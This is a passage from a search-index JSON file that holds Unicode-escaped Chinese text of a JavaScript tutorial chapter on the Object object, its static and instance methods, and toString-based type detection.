\u7684\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u8c03\u7528\u7ed3\u675f\u540e\uff0c\u8be5\u5bf9\u8c61\u81ea\u52a8\u9500\u6bc1\u3002\u6240\u4ee5\uff0c\u4e0b\u4e00\u6b21\u8c03\u7528 n \u7684\u5c5e\u6027\u65f6\uff0c\u5b9e\u9645\u53d6\u5230\u7684\u662f\u53e6\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5c5e\u6027 x \u5f53\u7136\u5c31\u8bfb\u4e0d\u51fa\u6765\u3002","title":"\u81ea\u5b9a\u4e49\u65b9\u6cd5"},{"location":"stdlib/object/","text":"Object \u5bf9\u8c61 \u00b6 \u6982\u8ff0 \u00b6 JavaScript \u539f\u751f\u63d0\u4f9b Object \u5bf9\u8c61\uff08\u6ce8\u610f\u8d77\u9996\u7684 O \u662f\u5927\u5199\uff09\uff0c\u672c\u7ae0\u4ecb\u7ecd\u8be5\u5bf9\u8c61\u539f\u751f\u7684\u5404\u79cd\u65b9\u6cd5\u3002 JavaScript \u7684\u6240\u6709\u5176\u4ed6\u5bf9\u8c61\u90fd\u7ee7\u627f\u81ea Object \u5bf9\u8c61\uff0c\u5373\u90a3\u4e9b\u5bf9\u8c61\u90fd\u662f Object \u7684\u5b9e\u4f8b\u3002 Object \u5bf9\u8c61\u7684\u539f\u751f\u65b9\u6cd5\u5206\u6210\u4e24\u7c7b\uff1a Object \u672c\u8eab\u7684\u65b9\u6cd5\u4e0e Object \u7684\u5b9e\u4f8b\u65b9\u6cd5\u3002 \uff081\uff09 Object \u5bf9\u8c61\u672c\u8eab\u7684\u65b9\u6cd5 \u6240\u8c13\u201c\u672c\u8eab\u7684\u65b9\u6cd5\u201d\u5c31\u662f\u76f4\u63a5\u5b9a\u4e49\u5728 Object \u5bf9\u8c61\u7684\u65b9\u6cd5\u3002 1 Object . print = function ( o ) { console . log ( o ) }; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c print \u65b9\u6cd5\u5c31\u662f\u76f4\u63a5\u5b9a\u4e49\u5728 Object \u5bf9\u8c61\u4e0a\u3002 \uff082\uff09 Object \u7684\u5b9e\u4f8b\u65b9\u6cd5 \u6240\u8c13\u5b9e\u4f8b\u65b9\u6cd5\u5c31\u662f\u5b9a\u4e49\u5728 Object \u539f\u578b\u5bf9\u8c61 Object.prototype \u4e0a\u7684\u65b9\u6cd5\u3002\u5b83\u53ef\u4ee5\u88ab Object \u5b9e\u4f8b\u76f4\u63a5\u4f7f\u7528\u3002 1 2 3 4 5 6 Object . prototype . print = function () { console . log ( this ); }; var obj = new Object (); obj . print () // Object \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Object.prototype \u5b9a\u4e49\u4e86\u4e00\u4e2a print \u65b9\u6cd5\uff0c\u7136\u540e\u751f\u6210\u4e00\u4e2a Object \u7684\u5b9e\u4f8b obj \u3002 obj \u76f4\u63a5\u7ee7\u627f\u4e86 Object.prototype \u7684\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 obj.print \u8c03\u7528 print \u65b9\u6cd5\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c obj \u5bf9\u8c61\u7684 print \u65b9\u6cd5\u5b9e\u8d28\u4e0a\u5c31\u662f\u8c03\u7528 Object.prototype.print \u65b9\u6cd5\u3002 \u5173\u4e8e\u539f\u578b\u5bf9\u8c61 object.prototype \u7684\u8be6\u7ec6\u89e3\u91ca\uff0c\u53c2\u89c1\u300a\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u300b\u7ae0\u8282\u3002\u8fd9\u91cc\u53ea\u8981\u77e5\u9053\uff0c\u51e1\u662f\u5b9a\u4e49\u5728 Object.prototype \u5bf9\u8c61\u4e0a\u9762\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u5c06\u88ab\u6240\u6709\u5b9e\u4f8b\u5bf9\u8c61\u5171\u4eab\u5c31\u53ef\u4ee5\u4e86\u3002 \u4ee5\u4e0b\u5148\u4ecb\u7ecd Object \u4f5c\u4e3a\u51fd\u6570\u7684\u7528\u6cd5\uff0c\u7136\u540e\u518d\u4ecb\u7ecd Object \u5bf9\u8c61\u7684\u539f\u751f\u65b9\u6cd5\uff0c\u5206\u6210\u5bf9\u8c61\u81ea\u8eab\u7684\u65b9\u6cd5\uff08\u53c8\u79f0\u4e3a\u201c\u9759\u6001\u65b9\u6cd5\u201d\uff09\u548c\u5b9e\u4f8b\u65b9\u6cd5\u4e24\u90e8\u5206\u3002 Object() \u00b6 Object \u672c\u8eab\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u53ef\u4ee5\u5f53\u4f5c\u5de5\u5177\u65b9\u6cd5\u4f7f\u7528\uff0c\u5c06\u4efb\u610f\u503c\u8f6c\u4e3a\u5bf9\u8c61\u3002\u8fd9\u4e2a\u65b9\u6cd5\u5e38\u7528\u4e8e\u4fdd\u8bc1\u67d0\u4e2a\u503c\u4e00\u5b9a\u662f\u5bf9\u8c61\u3002 \u5982\u679c\u53c2\u6570\u4e3a\u7a7a\uff08\u6216\u8005\u4e3a undefined \u548c null \uff09\uff0c Object() \u8fd4\u56de\u4e00\u4e2a\u7a7a\u5bf9\u8c61\u3002 1 2 3 4 5 6 var obj = Object (); // \u7b49\u540c\u4e8e var obj = Object ( undefined ); var obj = Object ( null ); obj instanceof Object // true \u4e0a\u9762\u4ee3\u7801\u7684\u542b\u4e49\uff0c\u662f\u5c06 undefined \u548c null \u8f6c\u4e3a\u5bf9\u8c61\uff0c\u7ed3\u679c\u5f97\u5230\u4e86\u4e00\u4e2a\u7a7a\u5bf9\u8c61 obj \u3002 instanceof \u8fd0\u7b97\u7b26\u7528\u6765\u9a8c\u8bc1\uff0c\u4e00\u4e2a\u5bf9\u8c61\u662f\u5426\u4e3a\u6307\u5b9a\u7684\u6784\u9020\u51fd\u6570\u7684\u5b9e\u4f8b\u3002 obj instanceof Object \u8fd4\u56de true \uff0c\u5c31\u8868\u793a obj \u5bf9\u8c61\u662f Object \u7684\u5b9e\u4f8b\u3002 \u5982\u679c\u53c2\u6570\u662f\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c Object \u65b9\u6cd5\u5c06\u5176\u8f6c\u4e3a\u5bf9\u5e94\u7684\u5305\u88c5\u5bf9\u8c61\u7684\u5b9e\u4f8b\uff08\u53c2\u89c1\u300a\u539f\u59cb\u7c7b\u578b\u7684\u5305\u88c5\u5bf9\u8c61\u300b\u4e00\u7ae0\uff09\u3002 1 2 3 4 5 6 7 8 9 10 11 var obj = Object ( 1 ); obj instanceof Object // true obj instanceof Number // true var obj = Object ( 'foo' ); obj instanceof Object // true obj instanceof String // true var obj = Object ( true ); obj instanceof Object // true obj instanceof Boolean // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Object \u51fd\u6570\u7684\u53c2\u6570\u662f\u5404\u79cd\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u8f6c\u6362\u6210\u5bf9\u8c61\u5c31\u662f\u539f\u59cb\u7c7b\u578b\u503c\u5bf9\u5e94\u7684\u5305\u88c5\u5bf9\u8c61\u3002 \u5982\u679c Object \u65b9\u6cd5\u7684\u53c2\u6570\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5b83\u603b\u662f\u8fd4\u56de\u8be5\u5bf9\u8c61\uff0c\u5373\u4e0d\u7528\u8f6c\u6362\u3002 1 2 3 4 5 6 7 8 9 10 11 var arr = []; var obj = Object ( arr ); // \u8fd4\u56de\u539f\u6570\u7ec4 obj === arr // true var value = {}; var obj = Object ( value ) // \u8fd4\u56de\u539f\u5bf9\u8c61 obj === value // true var fn = function () {}; var obj = Object ( fn ); // \u8fd4\u56de\u539f\u51fd\u6570 obj === fn // true \u5229\u7528\u8fd9\u4e00\u70b9\uff0c\u53ef\u4ee5\u5199\u4e00\u4e2a\u5224\u65ad\u53d8\u91cf\u662f\u5426\u4e3a\u5bf9\u8c61\u7684\u51fd\u6570\u3002 1 2 3 4 5 6 function isObject ( value ) { return value === Object ( value ); } isObject ([]) // true isObject ( true ) // false Object \u6784\u9020\u51fd\u6570 \u00b6 Object \u4e0d\u4ec5\u53ef\u4ee5\u5f53\u4f5c\u5de5\u5177\u51fd\u6570\u4f7f\u7528\uff0c\u8fd8\u53ef\u4ee5\u5f53\u4f5c\u6784\u9020\u51fd\u6570\u4f7f\u7528\uff0c\u5373\u524d\u9762\u53ef\u4ee5\u4f7f\u7528 new \u547d\u4ee4\u3002 Object \u6784\u9020\u51fd\u6570\u7684\u9996\u8981\u7528\u9014\uff0c\u662f\u76f4\u63a5\u901a\u8fc7\u5b83\u6765\u751f\u6210\u65b0\u5bf9\u8c61\u3002 1 var obj = new Object (); \u6ce8\u610f\uff0c\u901a\u8fc7 var obj = new Object() \u7684\u5199\u6cd5\u751f\u6210\u65b0\u5bf9\u8c61\uff0c\u4e0e\u5b57\u9762\u91cf\u7684\u5199\u6cd5 var obj = {} \u662f\u7b49\u4ef7\u7684\u3002\u6216\u8005\u8bf4\uff0c\u540e\u8005\u53ea\u662f\u524d\u8005\u7684\u4e00\u79cd\u7b80\u4fbf\u5199\u6cd5\u3002 Object \u6784\u9020\u51fd\u6570\u7684\u7528\u6cd5\u4e0e\u5de5\u5177\u65b9\u6cd5\u5f88\u76f8\u4f3c\uff0c\u51e0\u4e4e\u4e00\u6a21\u4e00\u6837\u3002\u4f7f\u7528\u65f6\uff0c\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u53c2\u6570\uff0c\u5982\u679c\u8be5\u53c2\u6570\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5219\u76f4\u63a5\u8fd4\u56de\u8fd9\u4e2a\u5bf9\u8c61\uff1b\u5982\u679c\u662f\u4e00\u4e2a\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u5219\u8fd4\u56de\u8be5\u503c\u5bf9\u5e94\u7684\u5305\u88c5\u5bf9\u8c61\uff08\u8be6\u89c1\u300a\u5305\u88c5\u5bf9\u8c61\u300b\u4e00\u7ae0\uff09\u3002 1 2 3 4 5 6 var o1 = { a : 1 }; var o2 = new Object ( o1 ); o1 === o2 // true var obj = new Object ( 123 ); obj instanceof Number // true \u867d\u7136\u7528\u6cd5\u76f8\u4f3c\uff0c\u4f46\u662f Object(value) \u4e0e new Object(value) \u4e24\u8005\u7684\u8bed\u4e49\u662f\u4e0d\u540c\u7684\uff0c Object(value) \u8868\u793a\u5c06 value \u8f6c\u6210\u4e00\u4e2a\u5bf9\u8c61\uff0c new Object(value) \u5219\u8868\u793a\u65b0\u751f\u6210\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5b83\u7684\u503c\u662f value \u3002 Object \u7684\u9759\u6001\u65b9\u6cd5 \u00b6 \u6240\u8c13\u201c\u9759\u6001\u65b9\u6cd5\u201d\uff0c\u662f\u6307\u90e8\u7f72\u5728 Object \u5bf9\u8c61\u81ea\u8eab\u7684\u65b9\u6cd5\u3002 Object.keys()\uff0cObject.getOwnPropertyNames() \u00b6 Object.keys \u65b9\u6cd5\u548c Object.getOwnPropertyNames \u65b9\u6cd5\u90fd\u7528\u6765\u904d\u5386\u5bf9\u8c61\u7684\u5c5e\u6027\u3002 Object.keys \u65b9\u6cd5\u7684\u53c2\u6570\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\u3002\u8be5\u6570\u7ec4\u7684\u6210\u5458\u90fd\u662f\u8be5\u5bf9\u8c61\u81ea\u8eab\u7684\uff08\u800c\u4e0d\u662f\u7ee7\u627f\u7684\uff09\u6240\u6709\u5c5e\u6027\u540d\u3002 1 2 3 4 5 6 var obj = { p1 : 123 , p2 : 456 }; Object . keys ( obj ) // [\"p1\", \"p2\"] Object.getOwnPropertyNames \u65b9\u6cd5\u4e0e Object.keys \u7c7b\u4f3c\uff0c\u4e5f\u662f\u63a5\u53d7\u4e00\u4e2a\u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u5305\u542b\u4e86\u8be5\u5bf9\u8c61\u81ea\u8eab\u7684\u6240\u6709\u5c5e\u6027\u540d\u3002 1 2 3 4 5 6 var obj = { p1 : 123 , p2 : 456 }; Object . getOwnPropertyNames ( obj ) // [\"p1\", \"p2\"] \u5bf9\u4e8e\u4e00\u822c\u7684\u5bf9\u8c61\u6765\u8bf4\uff0c Object.keys() \u548c Object.getOwnPropertyNames() \u8fd4\u56de\u7684\u7ed3\u679c\u662f\u4e00\u6837\u7684\u3002\u53ea\u6709\u6d89\u53ca\u4e0d\u53ef\u679a\u4e3e\u5c5e\u6027\u65f6\uff0c\u624d\u4f1a\u6709\u4e0d\u4e00\u6837\u7684\u7ed3\u679c\u3002 Object.keys \u65b9\u6cd5\u53ea\u8fd4\u56de\u53ef\u679a\u4e3e\u7684\u5c5e\u6027\uff08\u8be6\u89c1\u300a\u5bf9\u8c61\u5c5e\u6027\u7684\u63cf\u8ff0\u5bf9\u8c61\u300b\u4e00\u7ae0\uff09\uff0c Object.getOwnPropertyNames \u65b9\u6cd5\u8fd8\u8fd4\u56de\u4e0d\u53ef\u679a\u4e3e\u7684\u5c5e\u6027\u540d\u3002 1 2 3 4 var a = [ 'Hello' , 'World' ]; Object . keys ( a ) // [\"0\", \"1\"] Object . getOwnPropertyNames ( a ) // [\"0\", \"1\", \"length\"] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6570\u7ec4\u7684 length \u5c5e\u6027\u662f\u4e0d\u53ef\u679a\u4e3e\u7684\u5c5e\u6027\uff0c\u6240\u4ee5\u53ea\u51fa\u73b0\u5728 Object.getOwnPropertyNames \u65b9\u6cd5\u7684\u8fd4\u56de\u7ed3\u679c\u4e2d\u3002 \u7531\u4e8e JavaScript \u6ca1\u6709\u63d0\u4f9b\u8ba1\u7b97\u5bf9\u8c61\u5c5e\u6027\u4e2a\u6570\u7684\u65b9\u6cd5\uff0c\u6240\u4ee5\u53ef\u4ee5\u7528\u8fd9\u4e24\u4e2a\u65b9\u6cd5\u4ee3\u66ff\u3002 1 2 3 4 5 6 7 var obj = { p1 : 123 , p2 : 456 }; Object . keys ( obj ). length // 2 Object . getOwnPropertyNames ( obj ). length // 2 \u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u51e0\u4e4e\u603b\u662f\u4f7f\u7528 Object.keys \u65b9\u6cd5\uff0c\u904d\u5386\u5bf9\u8c61\u7684\u5c5e\u6027\u3002 \u5176\u4ed6\u65b9\u6cd5 \u00b6 \u9664\u4e86\u4e0a\u9762\u63d0\u5230\u7684\u4e24\u4e2a\u65b9\u6cd5\uff0c Object \u8fd8\u6709\u4e0d\u5c11\u5176\u4ed6\u9759\u6001\u65b9\u6cd5\uff0c\u5c06\u5728\u540e\u6587\u9010\u4e00\u8be6\u7ec6\u4ecb\u7ecd\u3002 \uff081\uff09\u5bf9\u8c61\u5c5e\u6027\u6a21\u578b\u7684\u76f8\u5173\u65b9\u6cd5 Object.getOwnPropertyDescriptor() \uff1a\u83b7\u53d6\u67d0\u4e2a\u5c5e\u6027\u7684\u63cf\u8ff0\u5bf9\u8c61\u3002 Object.defineProperty() \uff1a\u901a\u8fc7\u63cf\u8ff0\u5bf9\u8c61\uff0c\u5b9a\u4e49\u67d0\u4e2a\u5c5e\u6027\u3002 Object.defineProperties() \uff1a\u901a\u8fc7\u63cf\u8ff0\u5bf9\u8c61\uff0c\u5b9a\u4e49\u591a\u4e2a\u5c5e\u6027\u3002 \uff082\uff09\u63a7\u5236\u5bf9\u8c61\u72b6\u6001\u7684\u65b9\u6cd5 Object.preventExtensions() \uff1a\u9632\u6b62\u5bf9\u8c61\u6269\u5c55\u3002 Object.isExtensible() \uff1a\u5224\u65ad\u5bf9\u8c61\u662f\u5426\u53ef\u6269\u5c55\u3002 Object.seal() \uff1a\u7981\u6b62\u5bf9\u8c61\u914d\u7f6e\u3002 Object.isSealed() \uff1a\u5224\u65ad\u4e00\u4e2a\u5bf9\u8c61\u662f\u5426\u53ef\u914d\u7f6e\u3002 Object.freeze() \uff1a\u51bb\u7ed3\u4e00\u4e2a\u5bf9\u8c61\u3002 Object.isFrozen() \uff1a\u5224\u65ad\u4e00\u4e2a\u5bf9\u8c61\u662f\u5426\u88ab\u51bb\u7ed3\u3002 \uff083\uff09\u539f\u578b\u94fe\u76f8\u5173\u65b9\u6cd5 Object.create() \uff1a\u8be5\u65b9\u6cd5\u53ef\u4ee5\u6307\u5b9a\u539f\u578b\u5bf9\u8c61\u548c\u5c5e\u6027\uff0c\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u5bf9\u8c61\u3002 Object.getPrototypeOf() \uff1a\u83b7\u53d6\u5bf9\u8c61\u7684 Prototype \u5bf9\u8c61\u3002 Object \u7684\u5b9e\u4f8b\u65b9\u6cd5 \u00b6 \u9664\u4e86\u9759\u6001\u65b9\u6cd5\uff0c\u8fd8\u6709\u4e0d\u5c11\u65b9\u6cd5\u5b9a\u4e49\u5728 Object.prototype \u5bf9\u8c61\u3002\u5b83\u4eec\u79f0\u4e3a\u5b9e\u4f8b\u65b9\u6cd5\uff0c\u6240\u6709 Object \u7684\u5b9e\u4f8b\u5bf9\u8c61\u90fd\u7ee7\u627f\u4e86\u8fd9\u4e9b\u65b9\u6cd5\u3002 Object \u5b9e\u4f8b\u5bf9\u8c61\u7684\u65b9\u6cd5\uff0c\u4e3b\u8981\u6709\u4ee5\u4e0b\u516d\u4e2a\u3002 Object.prototype.valueOf() \uff1a\u8fd4\u56de\u5f53\u524d\u5bf9\u8c61\u5bf9\u5e94\u7684\u503c\u3002 Object.prototype.toString() \uff1a\u8fd4\u56de\u5f53\u524d\u5bf9\u8c61\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\u3002 Object.prototype.toLocaleString() \uff1a\u8fd4\u56de\u5f53\u524d\u5bf9\u8c61\u5bf9\u5e94\u7684\u672c\u5730\u5b57\u7b26\u4e32\u5f62\u5f0f\u3002 Object.prototype.hasOwnProperty() \uff1a\u5224\u65ad\u67d0\u4e2a\u5c5e\u6027\u662f\u5426\u4e3a\u5f53\u524d\u5bf9\u8c61\u81ea\u8eab\u7684\u5c5e\u6027\uff0c\u8fd8\u662f\u7ee7\u627f\u81ea\u539f\u578b\u5bf9\u8c61\u7684\u5c5e\u6027\u3002 Object.prototype.isPrototypeOf() \uff1a\u5224\u65ad\u5f53\u524d\u5bf9\u8c61\u662f\u5426\u4e3a\u53e6\u4e00\u4e2a\u5bf9\u8c61\u7684\u539f\u578b\u3002 Object.prototype.propertyIsEnumerable() \uff1a\u5224\u65ad\u67d0\u4e2a\u5c5e\u6027\u662f\u5426\u53ef\u679a\u4e3e\u3002 \u672c\u8282\u4ecb\u7ecd\u524d\u56db\u4e2a\u65b9\u6cd5\uff0c\u53e6\u5916\u4e24\u4e2a\u65b9\u6cd5\u5c06\u5728\u540e\u6587\u76f8\u5173\u7ae0\u8282\u4ecb\u7ecd\u3002 Object.prototype.valueOf() \u00b6 valueOf \u65b9\u6cd5\u7684\u4f5c\u7528\u662f\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\u7684\u201c\u503c\u201d\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u8fd4\u56de\u5bf9\u8c61\u672c\u8eab\u3002 1 2 var obj = new Object (); obj . valueOf () === obj // true \u4e0a\u9762\u4ee3\u7801\u6bd4\u8f83 obj.valueOf() \u4e0e obj \u672c\u8eab\uff0c\u4e24\u8005\u662f\u4e00\u6837\u7684\u3002 valueOf \u65b9\u6cd5\u7684\u4e3b\u8981\u7528\u9014\u662f\uff0cJavaScript \u81ea\u52a8\u7c7b\u578b\u8f6c\u6362\u65f6\u4f1a\u9ed8\u8ba4\u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5\uff08\u8be6\u89c1\u300a\u6570\u636e\u7c7b\u578b\u8f6c\u6362\u300b\u4e00\u7ae0\uff09\u3002 1 2 var obj = new Object (); 1 + obj // \"1[object Object]\" \u4e0a\u9762\u4ee3\u7801\u5c06\u5bf9\u8c61 obj \u4e0e\u6570\u5b57 1 \u76f8\u52a0\uff0c\u8fd9\u65f6 JavaScript \u5c31\u4f1a\u9ed8\u8ba4\u8c03\u7528 valueOf() \u65b9\u6cd5\uff0c\u6c42\u51fa obj \u7684\u503c\u518d\u4e0e 1 \u76f8\u52a0\u3002\u6240\u4ee5\uff0c\u5982\u679c\u81ea\u5b9a\u4e49 valueOf \u65b9\u6cd5\uff0c\u5c31\u53ef\u4ee5\u5f97\u5230\u60f3\u8981\u7684\u7ed3\u679c\u3002 1 2 3 4 5 6 var obj = new Object (); obj . valueOf = function () { return 2 ; }; 1 + obj // 3 \u4e0a\u9762\u4ee3\u7801\u81ea\u5b9a\u4e49\u4e86 obj \u5bf9\u8c61\u7684 valueOf \u65b9\u6cd5\uff0c\u4e8e\u662f 1 + obj \u5c31\u5f97\u5230\u4e86 3 \u3002\u8fd9\u79cd\u65b9\u6cd5\u5c31\u76f8\u5f53\u4e8e\u7528\u81ea\u5b9a\u4e49\u7684 obj.valueOf \uff0c\u8986\u76d6 Object.prototype.valueOf \u3002 Object.prototype.toString() \u00b6 toString \u65b9\u6cd5\u7684\u4f5c\u7528\u662f\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u8fd4\u56de\u7c7b\u578b\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 var o1 = new Object (); o1 . toString () // \"[object Object]\" var o2 = { a : 1 }; o2 . toString () // \"[object Object]\" \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u5bf9\u4e8e\u4e00\u4e2a\u5bf9\u8c61\u8c03\u7528 toString \u65b9\u6cd5\uff0c\u4f1a\u8fd4\u56de\u5b57\u7b26\u4e32 [object Object] \uff0c\u8be5\u5b57\u7b26\u4e32\u8bf4\u660e\u5bf9\u8c61\u7684\u7c7b\u578b\u3002 \u5b57\u7b26\u4e32 [object Object] \u672c\u8eab\u6ca1\u6709\u592a\u5927\u7684\u7528\u5904\uff0c\u4f46\u662f\u901a\u8fc7\u81ea\u5b9a\u4e49 toString \u65b9\u6cd5\uff0c\u53ef\u4ee5\u8ba9\u5bf9\u8c61\u5728\u81ea\u52a8\u7c7b\u578b\u8f6c\u6362\u65f6\uff0c\u5f97\u5230\u60f3\u8981\u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\u3002 1 2 3 4 5 6 7 var obj = new Object (); obj . toString = function () { return 'hello' ; }; obj + ' ' + 'world' // \"hello world\" \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u5f53\u5bf9\u8c61\u7528\u4e8e\u5b57\u7b26\u4e32\u52a0\u6cd5\u65f6\uff0c\u4f1a\u81ea\u52a8\u8c03\u7528 toString \u65b9\u6cd5\u3002\u7531\u4e8e\u81ea\u5b9a\u4e49\u4e86 toString \u65b9\u6cd5\uff0c\u6240\u4ee5\u8fd4\u56de\u5b57\u7b26\u4e32 hello world \u3002 \u6570\u7ec4\u3001\u5b57\u7b26\u4e32\u3001\u51fd\u6570\u3001Date \u5bf9\u8c61\u90fd\u5206\u522b\u90e8\u7f72\u4e86\u81ea\u5b9a\u4e49\u7684 toString \u65b9\u6cd5\uff0c\u8986\u76d6\u4e86 Object.prototype.toString \u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 [ 1 , 2 , 3 ]. toString () // \"1,2,3\" '123' . toString () // \"123\" ( function () { return 123 ; }). toString () // \"function () { // return 123; // }\" ( new Date ()). toString () // \"Tue May 10 2016 09:11:31 GMT+0800 (CST)\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6570\u7ec4\u3001\u5b57\u7b26\u4e32\u3001\u51fd\u6570\u3001Date \u5bf9\u8c61\u8c03\u7528 toString \u65b9\u6cd5\uff0c\u5e76\u4e0d\u4f1a\u8fd4\u56de [object Object] \uff0c\u56e0\u4e3a\u5b83\u4eec\u90fd\u81ea\u5b9a\u4e49\u4e86 toString \u65b9\u6cd5\uff0c\u8986\u76d6\u539f\u59cb\u65b9\u6cd5\u3002 toString() \u7684\u5e94\u7528\uff1a\u5224\u65ad\u6570\u636e\u7c7b\u578b \u00b6 Object.prototype.toString \u65b9\u6cd5\u8fd4\u56de\u5bf9\u8c61\u7684\u7c7b\u578b\u5b57\u7b26\u4e32\uff0c\u56e0\u6b64\u53ef\u4ee5\u7528\u6765\u5224\u65ad\u4e00\u4e2a\u503c\u7684\u7c7b\u578b\u3002 1 2 var obj = {}; obj . toString () // \"[object Object]\" \u4e0a\u9762\u4ee3\u7801\u8c03\u7528\u7a7a\u5bf9\u8c61\u7684 toString \u65b9\u6cd5\uff0c\u7ed3\u679c\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32 object Object \uff0c\u5176\u4e2d\u7b2c\u4e8c\u4e2a Object \u8868\u793a\u8be5\u503c\u7684\u6784\u9020\u51fd\u6570\u3002\u8fd9\u662f\u4e00\u4e2a\u5341\u5206\u6709\u7528\u7684\u5224\u65ad\u6570\u636e\u7c7b\u578b\u7684\u65b9\u6cd5\u3002 \u7531\u4e8e\u5b9e\u4f8b\u5bf9\u8c61\u53ef\u80fd\u4f1a\u81ea\u5b9a\u4e49 toString \u65b9\u6cd5\uff0c\u8986\u76d6\u6389 Object.prototype.toString \u65b9\u6cd5\uff0c\u6240\u4ee5\u4e3a\u4e86\u5f97\u5230\u7c7b\u578b\u5b57\u7b26\u4e32\uff0c\u6700\u597d\u76f4\u63a5\u4f7f\u7528 Object.prototype.toString \u65b9\u6cd5\u3002\u901a\u8fc7\u51fd\u6570\u7684 call \u65b9\u6cd5\uff0c\u53ef\u4ee5\u5728\u4efb\u610f\u503c\u4e0a\u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u5e2e\u52a9\u6211\u4eec\u5224\u65ad\u8fd9\u4e2a\u503c\u7684\u7c7b\u578b\u3002 1 Object . prototype . toString . call ( value ) \u4e0a\u9762\u4ee3\u7801\u8868\u793a\u5bf9 value \u8fd9\u4e2a\u503c\u8c03\u7528 Object.prototype.toString \u65b9\u6cd5\u3002 \u4e0d\u540c\u6570\u636e\u7c7b\u578b\u7684 Object.prototype.toString \u65b9\u6cd5\u8fd4\u56de\u503c\u5982\u4e0b\u3002 \u6570\u503c\uff1a\u8fd4\u56de [object Number] \u3002 \u5b57\u7b26\u4e32\uff1a\u8fd4\u56de [object String] \u3002 \u5e03\u5c14\u503c\uff1a\u8fd4\u56de [object Boolean] \u3002 undefined\uff1a\u8fd4\u56de [object Undefined] \u3002 null\uff1a\u8fd4\u56de [object Null] \u3002 \u6570\u7ec4\uff1a\u8fd4\u56de [object Array] \u3002 arguments \u5bf9\u8c61\uff1a\u8fd4\u56de [object Arguments] \u3002 \u51fd\u6570\uff1a\u8fd4\u56de [object Function] \u3002 Error \u5bf9\u8c61\uff1a\u8fd4\u56de [object Error] \u3002 Date \u5bf9\u8c61\uff1a\u8fd4\u56de [object Date] \u3002 RegExp \u5bf9\u8c61\uff1a\u8fd4\u56de [object RegExp] \u3002 \u5176\u4ed6\u5bf9\u8c61\uff1a\u8fd4\u56de [object Object] \u3002 \u8fd9\u5c31\u662f\u8bf4\uff0c Object.prototype.toString \u53ef\u4ee5\u770b\u51fa\u4e00\u4e2a\u503c\u5230\u5e95\u662f\u4ec0\u4e48\u7c7b\u578b\u3002 1 2 3 4 5 6 7 8 Object . prototype . toString . call ( 2 ) // \"[object Number]\" Object . prototype . toString . call ( '' ) // \"[object String]\" Object . prototype . toString . call ( true ) // \"[object Boolean]\" Object . prototype . toString . call ( undefined ) // \"[object Undefined]\" Object . prototype . toString . call ( null ) // \"[object Null]\" Object . prototype . toString . call ( Math ) // \"[object Math]\" Object . prototype . toString . call ({}) // \"[object Object]\" Object . prototype . toString . call ([]) // \"[object Array]\" \u5229\u7528\u8fd9\u4e2a\u7279\u6027\uff0c\u53ef\u4ee5\u5199\u51fa\u4e00\u4e2a\u6bd4 typeof \u8fd0\u7b97\u7b26\u66f4\u51c6\u786e\u7684\u7c7b\u578b\u5224\u65ad\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 12 var type = function ( o ){ var s = Object . prototype . toString . call ( o ); return s . match ( /\\[object (.*?)\\]/ )[ 1 ]. toLowerCase (); }; type ({}); // \"object\" type ([]); // \"array\" type ( 5 ); // \"number\" type ( null ); // \"null\" type (); // \"undefined\" type ( /abcd/ ); // \"regex\" type ( new Date ()); // \"date\" \u5728\u4e0a\u9762\u8fd9\u4e2a type \u51fd\u6570\u7684\u57fa\u7840\u4e0a\uff0c\u8fd8\u53ef\u4ee5\u52a0\u4e0a\u4e13\u95e8\u5224\u65ad\u67d0\u79cd\u7c7b\u578b\u6570\u636e\u7684\u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 var type = function ( o ){ var s = Object . prototype . toString . call ( o ); return s . match ( /\\[object (.*?)\\]/ )[ 1 ]. toLowerCase (); }; [ 'Null' , 'Undefined' , 'Object' , 'Array' , 'String' , 'Number' , 'Boolean' , 'Function' , 'RegExp' ]. forEach ( function ( t ) { type [ 'is' + t ] = function ( o ) { return type ( o ) === t . toLowerCase (); }; }); type . isObject ({}) // true type . isNumber ( NaN ) // true type . isRegExp ( /abc/ ) // true Object.prototype.toLocaleString() \u00b6 Object.prototype.toLocaleString 